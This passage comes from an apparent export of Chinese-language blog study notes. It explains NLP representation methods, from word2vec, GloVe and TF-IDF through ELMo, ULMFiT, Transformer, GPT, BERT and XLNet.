t_{k-1}\\right)+\\log p\\left(t_{k} | t_{k+1}, \\ldots, t_{N}\\right) \\] ​ Bi-LSTM，一组正向，一组反向。\\(t_k\\)之前的单词序列Context-before称为上文，之后的单词序列Context-after称为下文。 image 输入层和输出层改进 ​ ELMo 借鉴了 2016 年 Google Brain 的 Rafal Jozefowicz 等人发表的 Exploring the Limits of Language Modeling。输入层和输出层不再是 word，而是变为了一个 char-based CNN 结构。 输出层： ​ 将CBOW中的普通softmax: \\[ P\\left(w_{t} | c_{t}\\right)=\\frac{\\exp \\left(e^{\\prime}\\left(w_{t}\\right)^{T} x\\right)}{\\sum_{i=1}^{|V|} \\exp \\left(e^{\\prime}\\left(w_{i}\\right)^{T} x\\right)}, x=\\sum_{i \\in c} e\\left(w_{i}\\right) \\] ​ 转换为： \\[ p\\left(t_{k} | t_{1}, \\ldots, t_{k-1}\\right)=\\frac{\\exp \\left(C N N\\left(t_{k}\\right)^{T} h\\right)}{\\sum_{i=1}^{|V|} \\exp \\left(C N N\\left(t_{i}\\right)^{T} h\\right)}, h=L S T M\\left(t_{k} | t_{1}, \\ldots, t_{k-1}\\right) \\] ​ char-based CNN 模型是现成已有的，对于任意一个目标词都可以得到一个向量表示 CNN(\\(t_k\\)) 。利用 CNN 解决有三点优势: CNN 能减少做 Softmax 时全连接层中的必须要有的 |V|* h 的参数规模，只需保持 CNN 内部的参数大小即可。 (PS: 卷积核参数共享) CNN 可以解决 OOV （Out-of-Vocabulary）问题，这个在翻译问题中尤其头疼 在预测阶段，CNN 对于每一个词向量的计算可以预先做好，更能够减轻 inference 阶段的计算压力。 输入层： ​ 相似结构，不同输出。训练时间会略微增加，因为原来的 look-up 操作可以做到更快一些。 ​ 句子中每个单词都能得到对应的三个Embedding: ​ 最底层是单词的Word Embedding，往上走是第一层双向LSTM中对应单词位置的Embedding，这层编码单词的句法信息更多一些；再往上走是第二层LSTM中对应单词位置的Embedding，这层编码单词的语义信息更多一些。 结果： ​ 有三层的词向量可以利用： 输入层 CNN 的输出，即是 LSTM 的输入向量， 第一层 LSTM 的hidden state：这层编码单词的句法信息更多一些 第二层的hidden state：这层编码单词的语义信息更多一些 LSTM 是双向的，因此对于任意一个词，如果 LSTM 的层数为 L 的话，总共可获得的向量个数为 2L+1。 ​ 对于每一个词，可以根据下面的式子得到它的向量，其中 γ 是一个 scale 因子，加入这个因子主要是想将 ELMo 的向量与具体任务的向量分布拉平到同一个分布水平： \\[ \\mathbf{E} \\mathbf{L} \\mathbf{M} \\mathbf{o} k^{t a s k}=\\gamma^{t a s k} \\sum j= s_{j}^{t a s k} \\mathbf{h}_{k, j} \\] \\(\\mathbf{h}_{k, j}\\)便是针对每一层的输出向量，利用一个 softmax 的参数来学习不同层的权值参数\\(s_{j}^{t a s k}\\)，因为不同任务需要的词语意义粒度也不一致，一般认为浅层的表征比较倾向于句法，而高层输出的向量比较倾向于语义信息。 因此通过一个 softmax 的结构让任务自动去学习各层之间的权重。 计算复杂度 ​ 基于传统统计的 N-gram 还是普通神经网络的 NNLM 结构，都会有一个很严重的问题，那就是计算复杂度随着上下文窗口 N 大小的增大急剧上升。 N-gram 是指数上升；NNLM 是以 |d| × N 的形式增加。 ​ CBOW 和 Skip-gram 以及再后来的 GloVe 终于做到了计算复杂度与所选窗口大小无关，BUT只是预测单个词的计算时间复杂度，如果是求整个输入序列的话，还是避免不了要与序列长度相关。 ​ 这几种方法（N-gram, ..., GloVe），它们都受限于所使用的模型表征能力，某种意义上都只能得到比较偏上下文共现意义上的词向量，并且也很少考虑过词序对于词的意义的影响。 ​ ​ RNN 结构的计算复杂度： 纵向上主要是 RNN 结构本身的时间复杂度 RNN 结构内部的 hidden state 维度 模型结构的复杂度 在 ELMo 中的话还跟词典大小相关（因为最后一层还是一个词典大小上的分类问题，以及输入也需要维护一个词典大小的 loop up 操作） 但是在机器性能提升的情况下，这一部分至少不是阻碍词向量技术发展的最关键的因素了 横向上的计算复杂度，就主要是受制于输入序列的长度 RNN 结构本身因为在时间序列上共享参数，其自身计算复杂度这一部分不变 输入序列长度 从词向量到句子向量 无监督句子表示：将句子表示成定长向量 基线模型：word2vec 模型：AE(Auto Encoder)，LM(language model)，Skip-Thoughts等 本身的信息 上下文的信息 任务的信息 PV-DM 和 PV-DBOW ​ PV-DM 的全称是 Distributed Memory Model of Paragraph Vectors： ​ 类似CBOW，输入=&gt;&gt;文档向量+上下文向量；输出=&gt;&gt;下一个词向量。有新文档需要再走一遍训练流程 ​ PV-DBOW 的全称则是 Distributed Bag of Words version of Paragraph Vector ​ 和 Skip-gram 类似，通过文档来预测文档内的词，训练的时候，随机采样一些文本片段，然后再从这个片段中采样一个词，让 PV-DBOW 模型来预测这个词。 From Mikolov et al. experiment, PV-DM is consistently better than PV-DBOW. Concatenation way is often better than sum/ average. image ​ 问题：很难去表征词语之间的更丰富的语义结构 Skip-thoughts ​ Skip-thoughts 直接在句子间进行预测，也就是将 Skip-gram 中以词为基本单位，替换成了以句子为基本单位 ​ 具体做法就是选定一个窗口，遍历其中的句子，然后分别利用当前句子去预测和输出它的上一句和下一句 对于句子的建模利用的 RNN 的 sequence 结构，预测上一个和下一个句子时候，也是利用的一个 sequence 的 RNN 来生成句子中的每一个词，所以这个结构本质上就是一个 Encoder-Decoder 框架，只不过和普通框架不一样的是，Skip-thoughts 有两个 Decoder。 image Quick-thoughts ​ 解决Skip-thoughts中RNN训练太慢的问题 ​ 把 Skip-thoughts 的生成任务改进成为了一个分类任务，具体说来就是把同一个上下文窗口中的句子对标记为正例，把不是出现在同一个上下文窗口中的句子对标记为负例，并将这些句子对输入模型，让模型判断这些句子对是否是同一个上下文窗口中，很明显，这是一个分类任务。 image InferSent ​ 思想特别简单，先设计一个模型在斯坦福的 SNLI（Stanford Natural Language Inference）数据集上训练，而后将训练好的模型当做特征提取器，以此来获得一个句子的向量表示，再将这个句子的表示应用在新的分类任务上，来评估句子向量的优劣。 ​ 进行多任务学习，不同任务使得模型学习到不同特征的提取能力。 General Purpose Sentence Representation ​ 有很多相似的研究： ​ Learning General Purpose Distributed Sentence Representations via Large Scale Multi-task Learning，就提出了利用四种不同的监督任务来联合学习句子的表征，这四种任务分别是：Natural Language Inference，Skip-thougts，Neural Machine Translation 以及 Constituency Parsing 等 ​ 训练结束后，将模型的输出作为句子的表征（或者把这个联合学习的模型作为特征提取器），然后直接在这个表征上接上非常简单的全连接层做分类器，并且同时保证最底层的特征提取器中参数不动（也就是只把它当做特征提取器），再在新的分类任务上做训练（只训练最后接上的全连接层分类器），最后根据训练出来的简单分类器在各自分类任务的测试集上做评估。 Universal Sentence Encoder ​ 思路类似General Purpose Sentence Representation，只不过作者提出了利用 Transformer 和 DAN（上文提到过的和 CBOW 相似， *Deep Unordered Composition Rivals Syntactic Methods for Text Classification*）两种框架作为句子的 Encoder。 Transformer 结构更为复杂，参数更多，训练也相对比较耗时，但是一般来说效果会更好一些。 DAN 结构简单，只有两个隐藏层（甚至可以减小为只需要一个隐藏层），参数比较少，训练相对比较省时省资源，但是一般来说效果会差一些（并不是绝对，论文中也发现某些场景下 DAN 的效果甚至更好）。 ​ 作者既在无标记数据上训练，也在监督数据上训练，最后在十个分类任务上进行迁移学习的评估。 ​ 作者还放出了他们预训练好的 Encoder，可以供迁移学习的句子特征提取器使用。 预训练 Encoder：https://tfhub.dev/google/universal-sentence-encoder/2 ULMFit ​ Universal Language Model Fine-tuning for Text Classification 中，提出了ULMFit 结构，其实这本质上是他们提出的一个方法，而不是具体的某种结构或模型。主要应用于文本分类问题中。 ​ ULMFiT 最终在分类任务上表现惊艳，尤其是只需要 100 个标记数据，就能够学习到一个表现非常 comparable 的分类器。 ​ 和ELMo基本思路类似，也是预训练完成后在具体任务上进行 finetune，但不同之处也有很多。 ​ 分为三个阶段： 大规模预训练 任务数据预训练 接任务模型部分再次finetune ​ Averaged SGD ​ Averaged SGD 是指先将模型训练到一定 epoch，然后再将其后的每一轮权值进行平均后，得到最终的权值。 \\[ w_{k+1}=w_{k}-\\gamma_{k} \\nabla f\\left(w_{k}\\right) \\] 变成 \\[ w=\\frac{1}{K-T+1} \\sum_{i=T}^{K} w_{i} \\] ​ T 是一个阈值，而 K 是总共的迭代次数，这个式子的意思就是把迭代到第 T 次之后，对该参数在其后的第 T 轮到最后一轮之间的所有值求平均，从而得到最后模型的该参数值。 DropConnect ​ LSTM 上一个时刻和下一个时刻之间的隐藏层之间是有连接的，并且这个连接通过一个全连接的矩阵相连，而这个模型则用了 DropConnect 的方法随机 drop 掉一些连接，从而减少了一些过拟合的风险，当然在输入层到隐藏层之间也有正常的 dropout 操作。 微调的技巧(两次 finetune) 1. discriminative fine-tune ​ 不同层在训练更新参数的时候，赋予不同的学习率。 ​ 不同层的表征有不同的物理含义，比如浅层偏句法信息，高层偏语义信息，因此对于不同层的学习率不同。 \\[ \\theta_{t}^{l}=\\theta_{t-1}^{l}+\\eta^{l} \\nabla_{\\theta^{l}} J(\\theta) \\] \\[ \\eta^{l-1}=\\frac{\\eta^{l}}{2.6} \\] 2. slanted triangular learning rates 在 finetune 的第一阶段，希望能够先稳定住原来已经在大规模语料集上预训练好的参数， 选择比较小的 finetune 学习率 后逐步加大学习率，使得学习过程能够尽量快速。 当训练接近尾声时，逐步减小学习率，这样让模型逐渐平稳收敛。 计算： image T -- the number of training iterations； cut_frac -- the fraction of iterations we increase lr； cut -- the iteration when we switch fromincreasing to decreasing the lr; p -- the fraction ofthe number of iterations we have increased or willdecrease the LR respectively; ratio -- specifies how much smaller the lowest lr is from the maximum lr \\(η_{max}\\) 一般取：cut_frac= 0.1, ratio= 32 and \\(η_{max}\\)= 0.01 image gradual unfreezing ​ 预训练模型在新任务上 finetune 时，逐层解冻模型，先 finetune 最后一层，然后再解冻倒数第二层，把倒数第二层和最后一层一起 finetune，然后再解冻第三层。以此类推，逐层往浅层推进，最终 finetune 整个模型或者终止到某个中间层。这样做的目的也是为了 finetune 过程能够更平稳。 Transformer ​ 因为 Self-attention 的存在，才使得 Transformer 在做类似翻译问题的时候，可以让其 Encoder 不用做序列输入，而是将整个序列一次全输入，并且超长序列的输入也变得可能。而具体到 Self-attention 中，可以用下图表示。优质Blog image ​ Self-attention 中的多头机制便是将这样的操作分别进行多次，让句子的表征充分学习到不同的侧重点，最终将这些多头学习出来的表征 concat 到一起，然后再同一个全连接网络，便可以得到这个句子最终 Self-attention 下新的表示。 ​ 训练时： Decoder 中的输入可以用矩阵形式一次完成当前整个序列的 decode 过程，因为 ground truth 已经提前知道，只需做好每个词的 mask 就好 ​ inference 的时候：Decoder 必须按照序列输入，因为在生成每一个词的时候，必须先生成它的前一个词，无法一次将整个序列全部生成 Decoder 的 attention 实际包含两部分： 第一部分是带有 mask 的 Self-attention，通过 mask 将 decode 阶段的 attention 限定只会 attention 到已经生成过的词上，因此叫做 Mask Self-attention。 第二部分是普通的 Self-attention 操作，不过这时的 K 和 V 矩阵已经替换为 Encoder 的输出结果，所以本质上并非一个 Self-attention。 image ​ 结构展示： ​ Code GPT ​ GPT 使用的 Transformer 是只用了 Decoder，因为对于语言模型来讲，确实不需要 Encoder 的存在。 image ​ 要做超长的序列输入（可以长达 11000 个词），为了能够高效节省时间和内存的处理如此长的序列，做了一些 Memory-Compressed 工作，主要是两方面： 通过 CNN 操作，把 K 和 V 压缩到序列长度更小的一个矩阵，同时保持 Q 不变，这样也能在相当程度上减少计算量 把一个 batch 内部的序列按长度进行分组，然后分别在每个组内部进行 self-attention 操作，避免将一些很短的句子也 padding 到整个语料的最大长度； image ​ 利用语言模型的目标函数预训练完成后，便可以在具体任务上进行 finetune，和 ULMFiT 中的 finetune 分为两个阶段的方法不一样的是，GPT 直接把这两个过程糅合到一个目标函数中： \\[ L_{3}(C)=L_{2}(C)+\\lambda L_{1}(C) \\] ​ 其中 L2 是 task-specific 的目标函数， L1 则是语言模型的目标函数。论文中说这种联合学习方式能够让训练效果更好。 改造任务类型： 分类问题：直接在原序列的开始和末尾添加表示开始和末尾的符号， Text Entailment 问题：将 Premise 和 Hypothesis 通过一个中间分隔符“$”连接起来成为一个序列，然后同样在开头和末尾添加标记符号。 文本相似问题：因为序列 1 和序列 2 没有先后关系，因此将先后关系相反的两个序列作为输入。 Question Aswering ：将 query 和每个候选的 answer 都分别连接成一个序列作为输入，最后按各自的打分进行排序。 image ​ 对输入数据结构进行一定处理。 BERT ​ Bidirectional Encoder Representation from Transformers，进一步完善和扩展了 GPT 中设计的通用任务框架，使得 BERT 能够支持包括：句子对分类任务、单句子分类任务、阅读理解任务和序列标注任务。 模型特点 1. 利用了真双向的 Transformer Encoder 中用了 Self-attention 机制，而这个机制会将每一个词在整个输入序列中进行加权求和得到新的表征 更多的 transformer 的 block（意味着经过更多 Self-attention），那么互相交融的程度将会更高（Base 模型是 12层，Large 模型是 24层） Large 版本 BERT 的多头机制中 Head 个数多达 16 个，多种关系的学习 ELMo 与 GPT 本质上还是一个单向的模型，ELMo 稍微好一点，将两个单向模型的信息 concat起 来。GPT 则只用了单向模型， Decdoer 的天生基因决定的。显然句子中有的单词的语义会同时依赖于它左右两侧的某些词，仅仅从单方向做encoding是不能描述清楚的。 2. Mask-LM (Mask-Language Model) ​ 将单向预测的LM改变为双向的LM，预测目标变为什么？ ​ 为了利用双向信息，改进了普通语言模型成为完形填空式的 Mask-LM (Mask-Language Model)，随机选取15%的词进行Mask，然后预测。 输入序列依然和普通Transformer保持一致，只不过把挖掉的一个词用\"[MASK]\"替换 输出层在被挖掉的词位置，接一个分类层做词典大小上的分类问题，得到被 mask 掉的词概率大小 ​ BERT 针对如何做“[MASK]”，做了一些更深入的研究，它做了如下处理： 选取语料中所有词的 15% 进行随机 mask； 选中的词在 80% 的概率下被真实 mask； 选中的词在 10% 的概率下不做 mask，而被随机替换成其他一个词； 选中的词在 10% 的概率下不做 mask，仍然保留原来真实的词。 3. Next Sentence Prediction 任务学习句子级别信息 ​ 具体做法则是将两个句子组合成一个序列，组合方式会按照下面将要介绍的方式，然后让模型预测这两个句子是否为先后近邻的两个句子，也就是会把\"Next Sentence Prediction\"问题建模成为一个二分类问题。 ​ 句子级负采样： ​ 训练的时候，数据中有 50% 的情况这两个句子是先后关系，而另外 50% 的情况下，这两个句子是随机从语料中凑到一起的，也就是不具备先后关系，以此来构造训练数据。 ​ Multi-task: ​ 在预训练阶段，因为有两个任务需要训练：Mask-LM 和 Next Sentence Prediction 输入表示 ​ 起始标记都用“[CLS]”来表示，结束标记符用\"[SEP]\"表示，对于两个句子的输入情况，除了起始标记和结束标记之外，两个句子间通过\"[SEP]\"来进行区分。 用两个向量表示当前是句子 A 或句子 B 的。引入了“segment embedding”的概念来区分句子。 引入序列中词的位置信息，也用了 position embedding。和Transformer的sin、cos函数编码不同，直接去训练了一个position embedding。给每个位置词一个随机初始化的词向量，再训练。 [CLS]作为句子/句对的表示是直接跟分类器的输出层连接的。 下游任务 ​ NLP的四大任务： 对于单序列文本分类任务和序列对的文本分类任务使用框架基本一致，利用 Encoder 最后一层的第一个时刻“[CLS]”对应的输出作为分类器的输入 对于 SQuAD 1.1 任务来说，需要在给定段落中找到正确答案所在区间，这段区间通过一个起始符与终止符来进行标记 序列标注任务上进行 finetune，对于序列中的每个 token 而言，实际上就是一个分类任务。和前面提到的普通分类任务不一样的是，这里的分类需要针对序列中的每个词做分类，参数增加在 H × K ，这里的 K 是序列标注中标注的种类个数。 对于 SWAG 任务来讲，因为需要在给定一个句子后，从四个候选句子中选择一个最有可能是该句子的下一个句子，这里面通常包含了一些常识推理。将前置句子和四个候选句子分别进行组合成一个句子对, 给每一个候选句子进行打分，从而得到四个候选句子中最有可能是下一个的句子。 image ​ 对比参数及训练 image XLNet ​ 在两阶段新模式（预训练+Finetuning）下，应该会有更多的好工作涌现出来。根本原因在于：这个模式的潜力还没有被充分挖掘，貌似还有很大的提升空间。 ​ XLNet引入了自回归语言模型以及自编码语言模型的方法。 自回归语言模型（Autoregressive LM） ​ 自左向右预测下一个词的语言模型任务，或者反过来自右向左，这种类型的LM被称为自回归语言模型。 ​ GPT 就是典型的自回归语言模型。ELMo是分别有两个方向的自回归LM，然后把LSTM的两个方向的隐节点状态拼接到一起，体现双向语言模型。其实是两个自回归语言模型的拼接，本质上仍然是自回归语言模型。 优点 下游NLP任务有关，比如生成类NLP任务，文本摘要，机器翻译等，在实际生成内容的时候，就是从左向右的，自回归语言模型天然匹配这个过程。 Bert这种DAE模式，在生成类NLP任务中，就面临训练过程和推断过程（没有Mask）不一致的问题，导致生成类的NLP任务到目前为止都做不太好。 PS： DAE（DA Enhanced），Denoising Autoencoder：那些被Mask掉的单词就是在输入侧加入的所谓噪音。类似Bert这种预训练模式，被称为DAE LM AoA, 层叠式注意力机制（Attention-over-Attention） 缺点 ​ 只能利用上文或者下文的信息，不能同时利用上文和下文的信息，但是这在sequence inference这类任务中却更符合实际。ELMo这种双向都做，因为融合模式过于简单，所以效果其实并不是太好。 ​ GPT 2.0的作者却坚持沿用GPT 1.0 单向语言模型的旧瓶，装进去了更高质量更大规模预训练数据的新酒。 image ​ 而它的实验结果也说明了，如果想改善预训练语言模型，走这条扩充预序列模型训练数据的路子，是个多快好但是不省钱的方向。 自编码语言模型（Autoencoder LM） ​ DAE LM的优缺点正好和自回归LM反过来，它能比较自然地融入双向语言模型。 ​ Bert的缺点，主要在输入侧引入[Mask]标记，导致预训练阶段和Fine-tuning阶段不一致的问题，因为Fine-tuning阶段是看不到[Mask]标记的。 ​ XLNet的出发点就是： 能否融合自回归LM和DAE LM两者的优点。 另外一个是，Bert在第一个预训练阶段，假设句子中多个单词被Mask掉，这些被Mask掉的单词之间没有任何关系，是条件独立的，而有时候这些单词之间是有关系的，XLNet则考虑了这种关系 ​ XLNet共有三个因素： Permutation Language Model(简称PLM)：将双向信息学习方式，由预测[Mask]，变成对序列进行全排列，根据每种可能排序由前t - 1个词预测第t个词。来融入双向语言模型。 引入了Transformer-XL：相对位置编码以及分段RNN机制。相对位置编码关注相对位置偏差。分段RNN机制，将长文本划分为较短的文本输入transformer，将transformer单元作为RNN的cell，进行RNN方式的序列运算连接。 增加了预训练阶段使用的数据规模：Bert使用的预训练数据是BooksCorpus和英文Wiki数据，大小13G。XLNet除了使用这些数据外，另外引入了Giga5，ClueWeb以及Common Crawl数据，并排掉了其中的一些低质量数据，大小分别是16G,19G和78G。可以看出，在预训练阶段极大扩充了数据规模，并对质量进行了筛选过滤。 ​ 对于长文档的应用，Bert因为Transformer天然对长文档任务处理有弱点，所以XLNet对于长文档NLP任务相比Bert应该有直接且比较明显的性能提升作用，它在论文中也证明了这点。 总结 ​ 如何使用这些预训练好的模型。一般来说，可以有三种方式来使用： 将预训练模型当做一个特征提取器，直接将预训练模型的输出层去掉，然后使用去掉输出层之后的最后一层输出作为特征，输入到我们自己精心设计好的 Task-specific 模型中去。 在训练过程中，作为特征提取器的部分（比如 BERT Encoder）的参数是不变的。 将预训练模型整体接入 Task-specific 模型，继而重新在新的数据集上整体重新训练。 当然训练技巧可以有很多种，比如 ULMFiT 的三角学习率和逐层解冻或者是 Transformer 的 warmup 策略（上文都有提到），这些训练技巧非常重要，需要好好把控，否则很容易学崩了，甚至让原有预训练语言模型的优势都被新的 finetune 抹去了，因此需要实验设计一个比较好的 finetune 策略。 保留预训练模型的一部分，另外一部分则和 Task-specific 模型一起 finetune。 训练数据不算太多的情况，这个时候一方面要保证预训练模型在大规模语料上曾经学习到的表征，另一方面因为又要做新数据下的迁移，但是数据量比较少，重新 finetune 整个模型可能不太合适，容易导致模型的鲁棒性不高，那么似乎选择最后的一些层进行选择性的 finetune 会是比较好的方案 ​ 以 BERT 为代表的模型，简单粗暴，与人类语言习得过程中的轻量、泛化和低功耗截然相反。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"representation","slug":"representation","permalink":"https://racleray.github.io/tags/representation/"},{"name":"pretrained LM","slug":"pretrained-LM","permalink":"https://racleray.github.io/tags/pretrained-LM/"},{"name":"XLNet","slug":"XLNet","permalink":"https://racleray.github.io/tags/XLNet/"}]},{"title":"文本表示","slug":"文本表示","date":"2020-07-06T15:11:07.000Z","updated":"2023-08-07T11:54:31.045Z","comments":true,"path":"posts/2af352b4.html","link":"","permalink":"https://racleray.github.io/posts/2af352b4.html","excerpt":"计算机做不到直接对文本字符串进行语义理解和表示，因此需要进行数值化或者向量化。良好的文本表示形式可以极大的提升机器学习算法效果。记录一下常见的文本表示方法。","text":"文本表示 ​ 计算机做不到直接对文本字符串进行语义理解和表示，因此需要进行数值化或者向量化。良好的文本表示形式可以极大的提升机器学习算法效果。 1.表示方法 离散表示 one-hot表示 multi-hot表示 分布式表示 基于矩阵 基于降维的方法 基于聚类的方法 基于神经网络 CBOW Skip-gram NNLM C&amp;W 2.文本离散表示 bag of words ​ 将字符串视为一个 “装满字符（词）的袋子” ，袋子里的 词语是随便摆放的。 ​ [1,0,1,1,1,0,0,1,…] -- 向量的每个维度唯一对应着词表中的一个词。可见这个向量的大部分位置是0值，这种情况叫作“稀疏”。为了减少存储空间，我们也可以只储存非零值的位置。 优缺点 优点： 简单，方便，快速 在语料充足的前提下，对于简单的自然语言处理任务效果不错。如文本分类。 缺点： 其准确率往往比较低。凡是出现在文本中的词一视同仁，不能体现不同词在一句话中的不同的重要性。 无法关注词语之间的顺序关系，这是词袋子模型最大的缺点。如“武松打老虎”跟“老虎打武松”在词袋子模型中是认为一样的。 TF-IDF ​ 词频——TF（term frequency）：在当前文档中的词频 ​ 统计逆文档频率——IDF：基本假设是如果一个词语在不同的文档中反复出现，那么它对于识别该文本并不重要。 ​ \\[-log({出现该词语的文档占总文档出现的频率})\\] ​ IDF可以进行平滑：假设存在一个文档，包含所有的词。计算IDF时，分子分母都加一。 3.文本分布式表示 ​ one-hot vector：假设我们的词库总共有n个词，那我们开一个1*n的高维向量。 ​ \\[ w^{aardcark}= \\begin{bmatrix} ​ 1 \\\\ ​ 0 \\\\ ​ 0 \\\\ ​ \\vdots \\\\ ​ 0 \\end{bmatrix} , w^{a}= \\begin{bmatrix} ​ 0 \\\\ ​ 1 \\\\ ​ 0 \\\\ ​ \\vdots \\\\ ​ 0 \\end{bmatrix}\\] ​ 向量没办法给我们任何形式的词组相似性权衡。例如: ​ \\[(w^{hotel})^Tw^{motel}=0\\] ​ 一个极高维度的空间，然后每个词语都会占据一个维度，因此没有办法在空间中关联起来。 基于SVD降维的表示方法 ​ 建立一个词组文档矩阵\\(X\\)，具体是这么做的：遍历海量的文件，每次词组i出现在文件j中时，将\\(X_{ij}\\)的值加1。这会是个很大的矩阵\\(R^{|V| ×M}\\)，而且矩阵大小还和文档个数M有关系。 基于窗口的共现矩阵X ​ 规定一个固定大小的滑动窗口，然后统计每个中心词所在窗口中相邻词的词频。 I enjoy flying. I like NLP. I like deep learning. 有： ​ 对X做奇异值分解，只保留前k个维度： ​ 把子矩阵\\(U_{1:|V|,1:k}\\)视作我们的词嵌入矩阵。也就是说，对于词表中的每一个词，我们都用一个k维的向量来表达了。 ​ 问题在于： 矩阵的维度会经常变化（新的词语经常会增加，语料库的大小也会随时变化）。 矩阵是非常稀疏的，因为大多数词并不同时出现。 矩阵的维度通常非常高（\\(≈10^6×10^6\\)） 训练需要\\(O(n^2)\\)的复杂度（比如SVD） 需要专门对矩阵X进行特殊处理，以应对词组频率的极度不平衡的状况 ​ 有一些办法可以缓解一下上述提到的问题： 忽视诸如“he”、“the” 、“has”等功能词。 应用“倾斜窗口”（ramp window），即:根据文件中词组之间的距离给它们的共现次数增加相应的权重。 使用皮尔森的相关性（Pearson correlation），将0记为负数，而不是它原来的数值。 基于神经网络的表示方法 ​ 如果数据量不足，不要从零开始训练自己的词向量 连续词袋模型（CBOW） 以上下文，预测中心词。 \\(w_i\\):单词表V中的第i个单词，i维是1其他维是0的one-hot向量 \\(v\\in R^{n*|V|}\\)：输入词矩阵 \\(v_i\\)：V的第i列，单词\\(w_i\\)的输入向量 \\(u\\in R^{|V|*n}\\)：输出词矩阵 \\(u_i\\)：U的第i行，单词\\(w_i\\)的输出向量 \\(n\\)：“嵌入空间”（embedding space）的维度 整个过程: 对于m个词长度的窗口，one-hot向量（\\(x^{(c-m)},\\cdots,x^{(c-1)},x^{(c+1)},\\cdots,x^{(c+m)}\\)）。 上下文的嵌入词向量（\\(v_{c-m+1}=Vx^{(c-m+1)},\\cdots, v_{c+m}=Vx^{(c+m)}\\) ） 将这些向量取平均\\(\\hat v={v_{c-m}+v_{c-m+1}+\\cdots+v_{c+m}\\over2m}\\) 产生一个logits向量 \\(z=U\\hat v\\) 将得分向量转换成概率分布形式\\(\\hat y=softmax(z)\\) \\(y\\)是 \\(x^{c}\\) 的one-hot向量。计算损失\\[H(\\hat y,y)=-\\sum_{j=1}^{|V|}y_jlog(\\hat y_j)\\] y只是一个one-hot向量，于是上面的损失函数就可以简化为： ​ \\[H(\\hat y,y)=-y_ilog(\\hat y_i)\\] 最终的优化目标为： 用梯度下降法去更新每一个相关的词向量𝑢𝑐和𝑣𝑗 Skip-Gram 以中心词预测上下文。 \\(w_i\\):单词表V中的第i个单词，i维是1其他维是0的one-hot向量 \\(v\\in R^{n*|V|}\\)：输入词矩阵 \\(v_i\\)：V的第i列，单词\\(w_i\\)的输入向量 \\(u\\in R^{|V|*n}\\)：输出词矩阵 \\(u_i\\)：U的第i行，单词\\(w_i\\)的输出向量 \\(n\\)：“嵌入空间”（embedding space）的维度 整个过程: 生成one-hot输入向量x。 得到上下文的嵌入词向量\\(v_c=Vx\\)。 不需要取平均值的操作，所以直接是\\(v_c\\)。 通过\\(u=Uv_c\\)产生2m个logits向量\\(u_{c-m},\\cdots,u_{c-1},u_{c+1},\\cdots,u_{(c+m)}\\)。 将logits向量转换成概率分布形式\\(y=softmax(u)\\)。 产生的概率分布与真实概率分布\\(y^{c-m},\\cdots,y^{c-1},,y^{c+1}\\cdots,y^{c+m}\\)计算交叉熵损失。 最终的优化目标为： 不同的地方是我们这里需要引入朴素贝叶斯假设来将联合概率拆分成独立概率相乘。 负例采样（Negative Sampling） ​ 对整个单词表|V|求和的计算量是非常巨大的，任何一个对目标函数的更新和求值操作都会有O(|V|)的时间复杂度。我们需要一个思路去简化一下，我们想办法去求它的近似。 ​ Mikolov ET AL.在他的《Distributed Representations of Words and Phrases and their Compositionality》中提出了负例采样。 ​ 考虑一个“词-上下文”对（w,c），令P(D = 1|w, c)为(w, c)来自于语料库的概率。相应的，P(D = 0|w, c) 则是不来自于语料库的概率。对P(D = 1|w, c)用sigmoid函数建模： ​ \\[p(D=1|w,c,\\theta)= {1\\over{1+e^{(-v_c^Tv_w)}}}\\] ​ 建立一个新的目标函数。如果(w, c)真是来自于语料库，目标函数能够最大化P(D = 1|w, c)。 ​ \\(\\tilde D\\)表示不来自于语料库的数据。 ​ 在skip gram中，对于\\(c - m + j\\)位置的context 和 center word 的目标函数为：（所有上下文还要求和） ​ K -- 为负例样本的个数。 ​ 这样将 \\(|V|\\) words中的softmax，变成了 K个负例中进行 sigmoid ，减少了计算量。多分类目标变为二分类目标。 ​ 在CBOW中为： ​ 负例采样在word的词频分布的3/4次方上进行采样。使得分布更平滑。 Hierarchical Softmax ​ 对CBOW或者Skip gram的最后一层损失求解方式改进。目标不是目标单词的one hot编码，而是在所有单词预先构建好的Huffam tree中的huffman编码。 ​ 损失函数由Huffam tree中每个node的sigmoid函数预测结果和实际的huffman编码之间计算求得。 ​ Huffman tree保证了任何一个单词的编码不会是另一个单词的前缀。 ​ 构建流程： 根据所有单词的词频构建最小堆。 取出前两个最小单词（left child and right child），将二者词频之和作为新节点插入最小堆。 构建哈夫曼树，建立新树节点作为left child and right child的父节点，将上一步的left child and right child二者词频之和作为的该父节点的值，构建tree。 重复2、3步骤，直到min heap中只有一个node，此时，将这一个node作为tree的root。Huffam tree构建完毕。 ​ huffman编码：从root到leaf node的路径，走left child编码加入0，走right child编码加入1。最终编码为该leaf node对应的编码。 ​ 越常用的词（词频越高的词）拥有更短的编码。 ​ word2vec中正好采用了相反的编码规则，规定沿着左子树走，那么就是负类(哈夫曼树编码1)，沿着右子树走，那么就是正类(哈夫曼树编码0)。 ​ 每个tree node处： ​ \\[p(+)= {1\\over{1+e^{(-v_w^T\\theta)}}}\\] ​ 每个tree node都有参数\\(\\theta\\)，输入是skip gram模型最终输出的向量\\(v_w\\)。 Glove ​ 加入了global statistics，用某个大小window中两个单词的共现次数\\(X_{ij}\\)表示。 目标函数由cross entropy变为least square。 用\\(log(X_{ij})\\)作为“normalization cost”。（\\(X_{ij}\\) : number of times word j occur in the context of word i） \\(v_i\\)和\\(u_j\\)相乘，不需要用指数函数。(推导结果) 加入weighted function \\(f(X_{ij})\\) 损失函数： \\[ J=\\sum_{i=1}^{V} \\sum_{j=1}^{V} f\\left(X_{i j}\\right)\\left(w_{i}^{T} w_{j}+b_{i}+b_{j}-\\log X_{i j}\\right)^{2} \\] \\(X_{ij}\\) --\\(i\\ \\textrm{and}\\ j\\)在某个窗口大小中的共现频率 \\(f(X_{ij})\\)--权重系数，共现越多的 pair 对于目标函数贡献应该越大，但是又不能无限制增大，所以对共现频率过于大的 pair 限定最大值，以防训练的时候被这些频率过大的 pair 主导了整个目标函数。 b --两个偏置项 \\(w_{i}\\) --当前词的向量， \\(w_{j}\\) --对应的是与其在同一个窗口中出现的共现词的词向量，两者的向量点乘要去尽量拟合它们共现频率的对数值 ​ 如果两个词共现频率越高，那么其对数值当然也越高，因而算法要求二者词向量的点乘也越大。 ​ 